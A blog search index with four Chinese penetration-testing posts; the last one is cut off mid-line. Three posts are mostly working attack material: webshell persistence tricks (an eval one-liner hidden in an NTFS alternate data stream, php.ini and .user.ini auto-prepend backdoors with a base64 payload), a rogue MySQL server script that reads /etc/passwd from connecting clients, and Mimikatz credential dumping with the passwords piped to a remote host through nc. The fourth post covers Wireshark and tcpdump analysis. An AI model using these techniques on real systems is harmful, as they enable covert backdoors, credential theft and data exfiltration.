<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试--脚本权限维持之脚本隐藏</title>
      <link href="2020/11/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E8%84%9A%E6%9C%AC%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F/"/>
      <url>2020/11/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E8%84%9A%E6%9C%AC%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E8%84%9A%E6%9C%AC%E9%9A%90%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="脚本权限维持–脚本隐藏"><a href="#脚本权限维持–脚本隐藏" class="headerlink" title="脚本权限维持–脚本隐藏"></a>脚本权限维持–脚本隐藏</h1><h2 id="创建系统隐藏文件"><a href="#创建系统隐藏文件" class="headerlink" title="创建系统隐藏文件"></a>创建系统隐藏文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +h 文件名</span><br></pre></td></tr></table></figure><p>先查看是否存在文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; dir | findstr <span class="string">&quot;mimi&quot;</span></span><br><span class="line">-a---        <span class="number">2020</span>/<span class="number">11</span>/<span class="number">18</span>  ?? <span class="number">09</span>:<span class="number">27</span>    <span class="number">1045256</span> mimikatz.exe</span><br></pre></td></tr></table></figure><p>执行之后查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; dir | findstr <span class="string">&quot;mimi&quot;</span></span><br></pre></td></tr></table></figure><h2 id="利用ADS隐藏文件"><a href="#利用ADS隐藏文件" class="headerlink" title="利用ADS隐藏文件"></a>利用ADS隐藏文件</h2><p>NTFS交换数据流（Alternate　Data　Streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。</p><p>在资源管理器中却只能看到宿主文件，找不到寄宿文件。所有将shell文件作为寄宿文件。</p><h3 id="生成shell文件"><a href="#生成shell文件" class="headerlink" title="生成shell文件"></a>生成shell文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_REQUEST[1]);?&gt;&quot; &gt; index.php:shell.jpg</span><br></pre></td></tr></table></figure><h3 id="查看shell文件"><a href="#查看shell文件" class="headerlink" title="查看shell文件"></a>查看shell文件</h3><p>正常使用<code>dir</code>是看不到原文件到，我们需要使用<code>dir /r</code>，来查看，在文件夹中可以看到index.php，而看不到<code>index.php:shell.jpg</code>。</p><h3 id="利用shell文件"><a href="#利用shell文件" class="headerlink" title="利用shell文件"></a>利用shell文件</h3><p>文件包含<code>include.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&#39;index.php:shell.jpg&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>直接访问<code>include.php</code>，然后配合attrib隐藏include.php</p><h2 id="asp不死僵尸"><a href="#asp不死僵尸" class="headerlink" title="asp不死僵尸"></a>asp不死僵尸</h2><p>Windows下是不能以”aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9”这些系统保留文件名来命名文件或文件夹的，但是通过copy命令却可以实现，方法就是在cmd中输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy E:\steady\1.asp \\.\E:\steady\lpt2.wap.asp</span><br></pre></td></tr></table></figure><p>配合iis漏洞解析asp，在图形界面下根本无法删除，只能通过cmd中输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\.\E:\Web\asp\wwwroot\lpt2.wap.asp</span><br></pre></td></tr></table></figure><h2 id="phpinfo查看是否开启环境变量-include-path"><a href="#phpinfo查看是否开启环境变量-include-path" class="headerlink" title="phpinfo查看是否开启环境变量 include_path"></a>phpinfo查看是否开启环境变量 include_path</h2><p>利用<code>include_path</code>为不常见路径，waf很难添加到规则，将文件放到改目录下，然后使用php文件包含。</p><p>比如：</p><p>在C盘，创建<code>C:\php\pear</code>目录，把木马文件上传去。</p><p>在网站根目录进行文件包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;c:\php\pear\1.png&quot;)?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-ini后门"><a href="#php-ini后门" class="headerlink" title="php.ini后门"></a>php.ini后门</h2><p>将后门写入<code>php.ini</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On</span><br><span class="line">auto_prepend_file=<span class="string">&quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="user-ini后门"><a href="#user-ini后门" class="headerlink" title="user.ini后门"></a>user.ini后门</h2><p>程序执行时会先寻找当前目录下是否存在 .user.ini 文件，如果没有会继续向根目录寻找，直到配置目录下的 php.ini。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1.</span>txt</span><br><span class="line">user_ini.cache_ttl = <span class="number">10</span>  <span class="comment">//设置加载时间为10s 不需要重启apache时间一到自动加载。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql服务端伪造读取客户端文件</title>
      <link href="2020/11/24/mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"/>
      <url>2020/11/24/mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql服务端伪造读取客户端文件"><a href="#mysql服务端伪造读取客户端文件" class="headerlink" title="mysql服务端伪造读取客户端文件"></a>mysql服务端伪造读取客户端文件</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>伪造一个 MySQL 的服务端，当有客户端连接上这个假服务端的时候，我们就可以任意读取客户端的一个文件。在客户端发送查询之后，返回一个<code>Response TABULAR</code>数据包，并附上我们指定的文件，就可以读取客户端的文件了。伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在<code>LOAD DATA LOCAL</code>的时候。客户端必须具有 CLIENT_LOCAL_FILES 属性。</p><h2 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;1.txt&quot; into table TestTable;</span><br><span class="line">load data local infile &quot;&#x2F;1.txt&quot; into table TestTable;</span><br></pre></td></tr></table></figure><p>两者的功能都是读取文件，但是第一个读取的是服务端的文件，第二个读取的是客户端本地的文件。</p><p>注意：</p><p>如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 MySQL 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。</p><h2 id="Wireshark分析"><a href="#Wireshark分析" class="headerlink" title="Wireshark分析"></a>Wireshark分析</h2><p>客户端请求<code>load data infile</code></p><p>服务端返回一个文件名称</p><p>客户端将文件内容传递给服务端</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">&quot;&quot;</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">&#x27;Conn from: %r&#x27;</span>, address)</span><br><span class="line">conn.sendall(<span class="string">&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">&quot;auth okay&quot;</span>)</span><br><span class="line">conn.sendall(<span class="string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">&quot;want file...&quot;</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">&quot;\x00\x00\x01\xFB&quot;</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>攻击机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python /Users/apple/Desktop/<span class="number">1.</span>py</span><br><span class="line">INFO:root:Conn <span class="keyword">from</span>: (<span class="string">&#x27;172.20.10.4&#x27;</span>, <span class="number">64412</span>)</span><br><span class="line">INFO:root:auth okay</span><br><span class="line">INFO:root:want file...</span><br><span class="line">INFO:root:<span class="string">&quot;##</span></span><br><span class="line"><span class="string"># User Database</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># Note that this file is consulted directly only when the system is running</span></span><br><span class="line"><span class="string"># in single-user mode.  At other times this information is provided by</span></span><br><span class="line"><span class="string"># Open Directory.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># See the opendirectoryd(8) man page for additional information about</span></span><br><span class="line"><span class="string"># Open Directory.</span></span><br><span class="line"><span class="string">##</span></span><br><span class="line"><span class="string">nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">root:*:0:0:System Administrator:/var/root:/bin/sh</span></span><br><span class="line"><span class="string">daemon:*:1:1:System Services:/var/root:/usr/bin/false</span></span><br><span class="line"><span class="string">_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico</span></span><br><span class="line"><span class="string">_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false</span></span><br><span class="line"><span class="string">_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false</span></span><br><span class="line"><span class="string">_postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false</span></span><br><span class="line"><span class="string">_scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_appstore:*:33:33:Mac App Store Service:/var/db/appstore:/usr/bin/false</span></span><br></pre></td></tr></table></figure><p>受害机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot -h 172.20.10.4</span><br></pre></td></tr></table></figure><p>ps：</p><p>在phpMyAdmin里开启远程连接（将<code>phpMyAdmin/libraries/config.default.php的$cfg[&#39;AllowArbitraryServer&#39;]改为true</code>）。</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--Mimikatz的使用</title>
      <link href="2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取本地帐户密码"><a href="#获取本地帐户密码" class="headerlink" title="获取本地帐户密码"></a>获取本地帐户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p><p>cmd修改注册表命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">#重启或用户重新登录后可以成功抓取</span><br></pre></td></tr></table></figure><h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure><h3 id="Mimikatz-使用小技巧"><a href="#Mimikatz-使用小技巧" class="headerlink" title="Mimikatz 使用小技巧"></a>Mimikatz 使用小技巧</h3><h4 id="记录-Mimikatz输出"><a href="#记录-Mimikatz输出" class="headerlink" title="记录 Mimikatz输出"></a>记录 Mimikatz输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir</span><br></pre></td></tr></table></figure><h4 id="将输出导入到本地文件"><a href="#将输出导入到本地文件" class="headerlink" title="将输出导入到本地文件"></a>将输出导入到本地文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure><h4 id="将输出传输到远程机器"><a href="#将输出传输到远程机器" class="headerlink" title="将输出传输到远程机器"></a>将输出传输到远程机器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析--Wireshark使用</title>
      <link href="2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="文件导出功能"><a href="#文件导出功能" class="headerlink" title="文件导出功能"></a>文件导出功能</h2><h3 id="http导出功能"><a href="#http导出功能" class="headerlink" title="http导出功能"></a>http导出功能</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/50.png" alt="50"></p><h3 id="foremost分离"><a href="#foremost分离" class="headerlink" title="foremost分离"></a>foremost分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 1.jpg</span><br></pre></td></tr></table></figure><h3 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpxtract -f &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="NetworkMiner"><a href="#NetworkMiner" class="headerlink" title="NetworkMiner"></a>NetworkMiner</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/49.png" alt="49"></p><h2 id="分析TCP"><a href="#分析TCP" class="headerlink" title="分析TCP"></a>分析TCP</h2><h3 id="tcpick"><a href="#tcpick" class="headerlink" title="tcpick"></a>tcpick</h3><p>由于网络通信协议众多，TCP连接状态众多，所以TCP分析较为复杂。Kali  Linux提供一款专用工具tcpick。该工具支持在线实时嗅探和离线文件嗅探。它可以自动过滤出TCP流，并列出不同出TCP的相关信息，如源和目标地址/端口号、连接状态。该工具可以自动重组流数据，按照不同的格式进行保存。同时，该工具可以在终端以多种显示重组前和重组后的数据包内容，便于用户进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpick -C -yP -r attachment.pcapng</span><br><span class="line">Starting tcpick <span class="number">0.2</span><span class="number">.1</span> at <span class="number">2020</span><span class="number">-11</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">42</span> CST</span><br><span class="line">Timeout <span class="keyword">for</span> connections <span class="keyword">is</span> <span class="number">600</span></span><br><span class="line">tcpick: reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"><span class="number">1</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">nc -l -p <span class="number">4445</span> &gt; flag.zip</span><br><span class="line"><span class="number">2</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">PK....  ...NdbN..,.%...........flag.txtUT       ....z\..z\ux.............</span><br><span class="line">..(.y..z.. ..F.......:...<span class="comment">#B z..:...YPK....,.%.......PK......    ...NdbN..,.%.........................flag.txtUT.....z\ux.............PK..........N...w.....                                                                                                     </span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-2</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">unzip -P supercomplexpassword flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">  inflating: flag.txt                </span><br><span class="line"></span><br><span class="line"><span class="number">1</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">tcpick: done reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"></span><br><span class="line"><span class="number">24</span> packets captured                                                                                                             </span><br><span class="line"><span class="number">2</span> tcp sessions detected</span><br></pre></td></tr></table></figure><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client -&gt; server: SYN</span><br><span class="line">server -&gt; client: SYN+ACK</span><br><span class="line">client -&gt; server: ACK</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">02:52:44.513700 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [S] , seq 3310420140,                 length 0</span><br><span class="line">02:52:44.692890 IP 93.184.216.34.80 &gt; 172.17.0.9.41038: Flags [S.], seq 1353235534, ack 3310420141, length 0</span><br><span class="line">02:52:44.692953 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [.] ,                 ack 1353235535, length 0</span><br></pre></td></tr></table></figure><h4 id="第一次握手-SYN"><a href="#第一次握手-SYN" class="headerlink" title="第一次握手: SYN"></a>第一次握手: SYN</h4><p><code>#1</code> 包含以下信息：</p><ol><li><code>02:52:44.513700</code> 时刻，客户端主动向 server（93.184.216.34）发起一个 SYN 请求，请求建立连接</li><li>客户端请求的<strong>服务端端口是 80</strong>（HTTP 服务默认 80 端口），客户端使用的是<strong>临时端口</strong>（大于 1024）41038</li><li><code>#1</code> 序列号是 <code>3310420140</code>，这是客户端的初始序列号（客户端和服务端分别维护自己的序列号，两者没有关系；另外，初始序列号是系统选择的，一般不是 0）</li><li><code>#1</code> length 为 0，因为 SYN 包不带 TCP payload，所有信息都在 TCP header</li></ol><h4 id="第二次握手-SYN-ACK"><a href="#第二次握手-SYN-ACK" class="headerlink" title="第二次握手: SYN+ACK"></a>第二次握手: SYN+ACK</h4><p><code>#2</code> 的 ack 是 <code>3310420140</code>，等于 <code>#1</code> 的 seq 加 1，这就说明，<code>#2</code> 是 <code>#1</code> 的应 答包。</p><p>这个应答包的特点：</p><ol><li>TCP flags 为 <code>S.</code>，即 SYN+ACK</li><li>length 也是 0，说明没有 payload</li><li>seq 为 <code>1353235534</code>，这是<strong>服务端的初始序列号</strong></li><li>到达 eth0 的时间为 <code>02:52:44.692890</code>，说明时间过了 <code>18ms</code></li></ol><h4 id="第三次握手-ACK"><a href="#第三次握手-ACK" class="headerlink" title="第三次握手: ACK"></a>第三次握手: ACK</h4><p>同理，<code>#3</code> 的 ack 等于 <code>#2</code> 的 seq 加 1，说明 <code>#3</code> 是 <code>#2</code> 的应答包。</p><p>这个包的特点：</p><ol><li>TCP flags 为 <code>.</code>，即 ACK</li><li>长度为 0，说明没有 TCP payload</li></ol><p>至此，三次握手完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ 